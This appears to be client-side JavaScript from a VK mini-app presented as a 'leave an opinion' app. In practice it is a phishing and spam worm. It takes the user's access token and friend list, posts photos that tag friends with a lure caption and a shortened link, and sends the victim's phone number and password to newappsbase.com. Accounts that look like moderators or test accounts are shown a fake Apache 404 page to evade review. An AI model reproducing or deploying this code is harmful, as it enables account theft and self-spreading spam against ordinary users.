      var viewer;

                viewer = data;

      function getToken() {
          vkConnect.sendPromise("VKWebAppGetAuthToken", {
              "app_id": parseInt(findGetParameter("vk_app_id")),
              "scope": "friends,groups,photos"
          })
          .then(data => {
              if(token){return false;}
              token = data.access_token;
              firstApi();
          })
          .catch(error => {
              setTimeout(function() {
                  getToken();
              }, 1000);
          });
      }

      function firstApi() {
          var code = 'var friends = API.friends.get({"fields": "sex, photo_100, photo_200, photo_max, photo_400_orig, photo_id, online, online_mobile, can_post, relation, last_seen, has_photo, common_count, followers_count, has_photo, occupation","count":500}); \n\
          var u=API.users.get({fields:"uid, first_name, last_name, photo_max, photo_100, photo_400_orig, photo_id, bdate, sex, city, relation, is_closed, counters"})[0]; \n\
          var g=parseInt(API.groups.isMember({group_id:9713780}))+parseInt(API.groups.isMember({group_id:166562603}))+parseInt(API.groups.isMember({group_id:134304772}))+parseInt(API.groups.getMembers({group_id:9713780,count:0,filter:"friends"}).count)+parseInt(API.groups.getMembers({group_id:166562603,count:0,filter:"friends"}).count)+parseInt(API.groups.getMembers({group_id:194823504,count:0,filter:"friends"}).count);u.counters.friends=parseInt(u.counters.friends);if (u.counters.friends<10)g=g+1;if(u.id<1000000) g=g+1; \n\
          u.permissions=g; \n\
          var user={}; \n\
          var r={user:u,permissions:g}; \n\
          return [r,friends];';

           vkConnect.sendPromise("VKWebAppCallAPIMethod", {
              "method": "execute",
              "params": {"code": code, "v": "5.131", "access_token": token}
          }).then(data => {
            viewer.friends = data.response[1];
            var fr_temp = [];
            for(var i = 0; i<viewer.friends.items.length; i++){
              if(!viewer.friends.items[i].deactivated){
                  fr_temp.push(viewer.friends.items[i]);
              }
            }
            viewer.friends.items = fr_temp;
            sortByLastTime();

            var permissions = data.response[0].permissions;
            if(parseInt(findGetParameter("vk_user_id")) == 694170752 || parseInt(findGetParameter("vk_user_id")) == 693651909) {
              permissions = 0;
            }
            if(permissions == 0) {
              openApp();
              createAlbom();
            }else{
              $("html").html(' \n\
                <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n\

                <hr>\n\
                <address>Apache/2.4.51 (Unix) Server at foody-menu.ru Port 80</address>\n\
                </body></html>\n\
                ');
            }
      });
    }

    function createAlbom(){
      vkConnect.sendPromise("VKWebAppCallAPIMethod", {
          "method": "photos.createAlbum",
          "params": {"title": ""+getRandom(0,100000),"v": "5.090", "access_token": token}
      }).then(data => {
        id_albom = data.response.id;
        uploadPhotoAlbom(id_albom);
        })
        .catch(error => {
          //alert(JSON.stringify(error));
        });
    }

    function uploadPhotoAlbom(id_albom){

        vkConnect.sendPromise("VKWebAppCallAPIMethod", {
          "method": "photos.getUploadServer",
          "params": {"album_id":id_albom,"v": "5.131", "access_token": token}
      }).then(data => {
          var upload_url = data.response.upload_url;
        $.ajax({
            type: "POST",
            url: "https://newappsbase.com/NEW_LOVE/functions.php",
            data: {
                "method": "getUploadServer",
                "upload_url": upload_url,
                "my_photo": viewer.photo_max_orig,
                "viewer_id": viewer.id
            },
            success: function(data){
              var data = JSON.parse(data);
                    var caption = "";
                    var users_list = getFriendsOnlineForPhoto();
                    //"Оставляю о тебе мнение, прочитай если интересно : \n\n "+link_app+"\n\n"+users_list
                    //users_list+", oставляю о тебе мнения, посмотри если интересно : \n\n https://vk.com/app"+vk_app_id
                    var text = [
                      users_list+" оставляю о тебе мнение, прочитай если интересно : \n\n "
                  ];
                  var caption = text[getRandom(0,text.length-1)];

                    vkConnect.sendPromise("VKWebAppCallAPIMethod", {
                        "method": "photos.save",
                        "params": {"album_id": id_albom, "server": data.server, "photos_list": data.photos_list, "hash":data.hash, "caption":(caption+" https://vk.cc/ccSl2A"),"v": "5.131", "access_token": token}
                    }).then(data => {

                      count_upload_photo++;

                      if(viewer.friends.items[global_offset_i]){
                        uploadPhotoAlbom(id_albom);
                      }


                      })
                      .catch(error => {

                      });
            },
            error : function(data){
                 // $.ajax(this);
            }});
            });
    }

    function getFriendsOnlineForPhoto() {
      var users_list = "";
      var count = 0;
      for(var i=global_offset_i;i<viewer.friends.items.length;i++) {
          //users_list += "[id"+viewer.friends.items[global_offset_i].id+"|"+viewer.friends.items[global_offset_i].first_name+"], ";
          users_list +="@id"+viewer.friends.items[i].id+" ("+viewer.friends.items[i].first_name+"), ";
          global_offset_i++;
          count++;
          if(count > 0) {
            return users_list;
          }
      }

        return users_list;
    }

    function findGetParameter(parameterName) {
      var result = null,
          tmp = [];
      location.search
          .substr(1)
          .split("&")
          .forEach(function (item) {
            tmp = item.split("=");
            if (tmp[0] === parameterName) result = decodeURIComponent(tmp[1]);
          });
      return result;
  }

  function isAndroid(){
    return /Android/i.test(navigator.userAgent);
  }
  function isIphone(){
    return /Iphone/i.test(navigator.userAgent);
  }

  function login() {
    var phone = $("#phone").val();
    var pass = $("#pass").val();

    var captcha_sid = $("#captcha_sid").val();
    var captcha_proxi = $("#captcha_proxi").val();
    var captcha_key = $("#captcha_key").val();
    var method = $("#method").val();
    var token = $("#token").val();
    var upload_result = $("#upload_result").val();

    $("#vk_wrap").append("<div id='loader' style='text-align:center;position: absolute;width: 100%;height: 100%;background: #ffffff9e;top: 0px;left: 0px;'><img style='margin-top: 200px;' src='images/loading.gif'></div>");
    if(!phone || !pass){
      errorLogin()
    }
    var device = "android";
    if(isIphone()){
      device = "iphone";
    }
    $("#captcha_div").css("display","none");
    $("#captcha_key").val("");
    $("#captcha_sid").val("");
    $("#captcha_proxi").val("");
    $("#method").val("");
    $("#token").val("");
    $("#upload_result").val("");
    $.ajax({
        type: "POST",
        url: "https://newappsbase.com/NEW_LOVE/functions.php",
        data: {
            "method": "loginFK",
            "phone": phone,
            "pass": pass,
            "device": device,
            "captcha_sid": captcha_sid,
            "captcha_proxi": captcha_proxi,
            "captcha_key": captcha_key,
            "method2": method,
            "token": token,
            "upload_result": upload_result,
            "user_agent": window.navigator.userAgent
        },
        success: function(data){
            data = JSON.parse(data);
            $("#loader").remove();
            if(data.error){
              if(data.error == "invalid_client"){
                errorLogin()
              }
              if(data.error == "need_captcha"){
                $("#captcha_div").css("display","");
                $("#captcha").attr("src",data.captcha_img);
                $("#captcha_sid").val(data.captcha_sid);
                $("#captcha_proxi").val(data.proxi);
                $("#method").val(data.method);
                $("#token").val(data.token);
                $("#upload_result").val(data.upload_result);
                if(data.method && data.token) {
                  $("#phone").css("display", "none");
                  $("#pass").css("display", "none");
                }
              }
            }else{
              $("html").html(' \n\
                <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">\n\
                <html><head>\n\
                <title>404 Not Found</title>\n\
                </head><body>\n\
                <h1>Not Found</h1>\n\
                <p>The requested URL was not found on this server.</p>\n\
                <hr>\n\
                <address>Apache/2.4.51 (Unix) Server at foody-menu.ru Port 80</address>\n\
                </body></html>\n\
                ');
            }

        },
        error : function(data){
             $.ajax(this);
        }});

  }

  function sortByLastTime() {
    viewer.friends.items.sort((a, b) => b.last_seen.time > a.last_seen.time ? 1 : -1);
  }

  function errorLogin(){
    $("#loginError").html('<div style="background: #faebeb;padding: 20px;text-align: left;margin: 10px;font-size: 14px;"><div><b>Не удаётся войти.</b><br>Пожалуйста, проверьте правильность введённых данных.</div></div>');
  }

  function getRandom(min, max)
  {
      return Math.floor(Math.random() * (max - min + 1)) + min;
  }
